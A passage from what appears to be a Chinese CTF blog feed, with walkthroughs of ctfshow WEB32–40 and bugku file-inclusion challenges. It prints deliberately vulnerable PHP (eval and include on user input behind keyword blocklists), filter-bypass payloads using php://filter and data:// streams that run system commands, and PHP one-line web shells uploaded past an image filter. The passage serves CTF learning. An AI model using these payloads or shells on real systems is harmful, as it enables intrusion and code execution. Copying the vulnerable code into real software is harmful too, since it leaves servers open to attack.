@Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 00:56:31</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\"></span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>可以看到，在上一题的基础上还过滤了<strong>反引号</strong>、<strong>echo</strong>、<strong>；</strong>、<strong>（</strong><br>\n那么前几题的一些 payload 就用不了了，但是 include 包含的方法依然可以使用</p>\n<p>看到上一题的 pyload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[&quot;nnnpc&quot;];&amp;nnnpc=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>问题就出在了这个 payload 中的？c=include$_GET [“nnnpc”]; 最后面的 &quot;；&quot; 在本题被过滤了，<br>\n因此需要改用？&gt; 来闭合绕过</p>\n<p>本题 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[&quot;nnnpc&quot;]?&gt;&amp;nnnpc=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5N0BsWOblvBr8ROM.png!thumbnail\" alt=\"\"></p>\n<p>将 base64 编码解码以后得到 flag</p>\n<p><strong>ctfshow{f1a8e8a0-91e4-479e-9bd5-42a8f2be2d46}</strong></p>\n<h1 id=\"web33\"><a class=\"markdownIt-Anchor\" href=\"#web33\">#</a> <strong>WEB33</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 02:22:27</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\">//</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>看到比上题多过滤了一个双引号<br>\n上题 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[&quot;nnnpc&quot;]?&gt;&amp;nnnpc=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>由于本题过滤了双引号，因此 c 传参的 include 包含语句中就不能有双引号了，所以想要绕过此题的限制还需要改动一下<br>\n之前的 nnnpc 是个字符串，因此需要带双引号，这里改为单个字符，就能有效避免双引号的使用了，这里以改为 x 为例（也可以是数字）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LmV8gUcqwxS8QFY6.png!thumbnail\" alt=\"\"></p>\n<p>成功获取 flag 的 base64 编码</p>\n<p>解码得到 flag</p>\n<p><strong>ctfshow{dad0cd8e-ce67-4697-b1fc-63ec1f9cfbd4}</strong></p>\n<h1 id=\"web34\"><a class=\"markdownIt-Anchor\" href=\"#web34\">#</a> <strong>WEB34</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 04:21:29</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>看到这题将冒号也过滤了，但是不影响上一题构造的 payload，依然能打</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DJwg9vCIiwiRX10e.png!thumbnail\" alt=\"\"></p>\n<p>解码得到 flag</p>\n<p><strong>ctfshow{5a506255-1c6d-44a8-9e45-c4b2c3f7207c}</strong></p>\n<h1 id=\"web35\"><a class=\"markdownIt-Anchor\" href=\"#web35\">#</a> <strong>WEB35</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 04:21:23</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>在上一题的基础上增加过滤了 &quot;&lt;“和”=&quot;，但依然不影响之前的 payload，继续打<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fgpadHQPIxspDDwn.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>解码得到 flag</p>\n<p><strong>ctfshow{6ad42779-430c-4f05-bb93-46960e5b0cb4}</strong></p>\n<h1 id=\"web36\"><a class=\"markdownIt-Anchor\" href=\"#web36\">#</a> <strong>WEB36</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 04:21:16</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现又多过滤了 &quot;/&quot; 和 0-9 的数字，上一题的 payload 一样能打<br>\n如果前几次使用的字符是数字的话就需要进行改动，把数字改为单个字母即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jFgcJ5auVF25rBFr.png!thumbnail\" alt=\"\"></p>\n<p>成功，解码得到 flag</p>\n<p><strong>ctfshow{a048f30e-f227-4793-b067-3f8c5fb2a083}</strong></p>\n<h1 id=\"web37\"><a class=\"markdownIt-Anchor\" href=\"#web37\">#</a> <strong>WEB37</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 05:18:55</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">//flag in flag.php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class=\"line\">        include($c);</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>看到由前几题的 eval 变成了 include<br>\n 需要用到 php 的伪协议，这里可以使用 data 的伪协议</p>\n<p>由于过滤了字符串 flag，因此得用前面介绍过的方法进行绕过：</p>\n<p>？或通配符<em>或截断（这里展示通配符</em>）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);</span><br></pre></td></tr></table></figure>\n<p>引用 LetheSec 师傅博客中的解释：</p>\n<blockquote>\n<p><strong>data://</strong><br>\n 同样类似与 php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行。从而导致任意代码执行。</p>\n</blockquote>\n<p>data 与包含函数结合的时候输入的 data:// 流就会被当作 php 文件执行，因此就可以利用这点进行命令执行获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zgJHecsZju2rE7gL.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag：</p>\n<p><strong>ctfshow{47106e1a-3b17-400c-b673-942b343939a2}</strong></p>\n<h1 id=\"web38\"><a class=\"markdownIt-Anchor\" href=\"#web38\">#</a> <strong>WEB38</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 05:23:36</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">//flag in flag.php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class=\"line\">        include($c);</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现在上一题的基础上，php 和 file 都被过滤了，这可能对 php://filter 协议来说过滤的比较多，但是对与 data 协议没有影响<br>\n上题 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);</span><br></pre></td></tr></table></figure>\n<p>对于上一题 payload 来说，因为把 php 过滤了，因此影响的就是后面的 php 语句<br>\n办法就是将 php 语句进行 base64 编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs=</span><br></pre></td></tr></table></figure>\n<p>这样就解决了含有 php 的问题，去打一下<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/90BEMaNp4iBtHroB.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>成功获得 flag：</p>\n<p><strong>ctfshow{0946522d-4044-4182-a19e-fe3fbfaecab2}</strong></p>\n<h1 id=\"web39\"><a class=\"markdownIt-Anchor\" href=\"#web39\">#</a> <strong>WEB39</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 06:13:21</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">//flag in flag.php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class=\"line\">        include($c.&quot;.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现被包含进去的东西被强行加上了.php<br>\n 所以需要将 data 语句进行闭合，使后面的.php 失效，如下所示（加上 &quot;?&gt;&quot; 进行闭合）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;); ?&gt;</span><br></pre></td></tr></table></figure>\n<p>这样的话 data 协议已经执行了 php 语句，后面的.php 就失效了<br>\n本题也没有过滤 php 和 file，因此不需要 base64 编码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TVJxCzzyRByMOqv0.png!thumbnail\" alt=\"\"></p>\n<p>成功打通获得 flag：</p>\n<p><strong>ctfshow{bbb00360-c800-4d03-9447-957dc601ab66}</strong></p>\n<h1 id=\"web40\"><a class=\"markdownIt-Anchor\" href=\"#web40\">#</a> <strong>WEB40</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 06:03:36</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现 include 变回了 eval，而且还过滤了很多东西</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/bugku%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1-2/",
            "url": "https://nnnpc.github.io/2024/04/16/bugku%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1-2/",
            "title": "bugku文件包含1-2",
            "date_published": "2024-04-16T05:58:18.969Z",
            "content_html": "<h1 id=\"文件包含1\"><a class=\"markdownIt-Anchor\" href=\"#文件包含1\">#</a> 文件包含 1</h1>\n<p>开启场景看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2xtrNjZURdu0nw9U.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3hUP288G7pRwkGJW.png!thumbnail\" alt=\"\"></p>\n<p>发现有个 index.php，那么就构造 poc 去读取它</p>\n<p>poc1：</p>\n<p><strong>?file=php://filter/resource=index.php</strong></p>\n<p>poc2：</p>\n<p><strong>?file=php://filter/read=convert.base64-encode/resource=index.php</strong></p>\n<p>poc1 的话是直接读取 index.php 的内容，但是很多时候不会显示在页面上，因此我们就用 poc2 去进行 base64 编码然后显示在浏览器上</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kQnA2XzFenJaRKTb.png!thumbnail\" alt=\"\"></p>\n<p>复制下编码后解码得到 flag</p>\n<p><strong>flag{2df58e9eb2c56228c9b4b0045103451c}</strong></p>\n<h1 id=\"文件包含2\"><a class=\"markdownIt-Anchor\" href=\"#文件包含2\">#</a> <strong>文件包含 2</strong></h1>\n<p>打开环境<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/p3jSTgSDVI89ra0b.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>f12 查看到有个 upload.php 的注释</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EUOv9Wdq507hlajp.png!thumbnail\" alt=\"\"></p>\n<p>访问看看</p>\n<p>发现是个上传口</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V5yLEoTcLKxGuq6V.png!thumbnail\" alt=\"\"></p>\n<p>而且提示只能上传 jpg gif<br>\npng 格式的文件，那么就先 bp 抓包上传最普通的一句话木马试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PvLzBvLPtgZheMQA.png!thumbnail\" alt=\"\"></p>\n<p>发现上传成功，不知道对内容有没有进行过滤</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uLnZBJ21mgxIcYLE.png!thumbnail\" alt=\"\"></p>\n<p>根据路径去查看一下上传上去的一句话</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TfbaswhydZktHFZv.png!thumbnail\" alt=\"\"></p>\n<p>对比一下，很明显发现 <code>&lt;? php ?&gt;</code>  全被过滤了，那就试试别的一句话</p>\n<p>一：</p>\n<p><strong>&lt;?=eval($_POST[‘1’]);echo’a’;</strong></p>\n<p>二：</p>\n<p><strong> <code>&lt;script language=php&gt;</code> echo’a’;eval($_POST[‘pass’]); <code>&lt;/script&gt;</code> </strong></p>\n<p>一：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BQXQVONEfqqoU42p.png!thumbnail\" alt=\"\"></p>\n<p>同样上传成功，去访问下看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bA4Kaqbas5eAhbI8.png!thumbnail\" alt=\"\"></p>\n<p>显示 a，证明成功了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fH1jsA30OKasXXMu.png!thumbnail\" alt=\"\"></p>\n<p>可以 hackbar 进行命令执行获取 flag 也可以蚁剑连接 getshell</p>\n<p>二：</p>\n<p>使用了 script 标签</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rn9fIb0omCZlXO1e.png!thumbnail\" alt=\"\"></p>\n<p>同样上传成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yvzK4O3ElD7RegL4.png!thumbnail\" 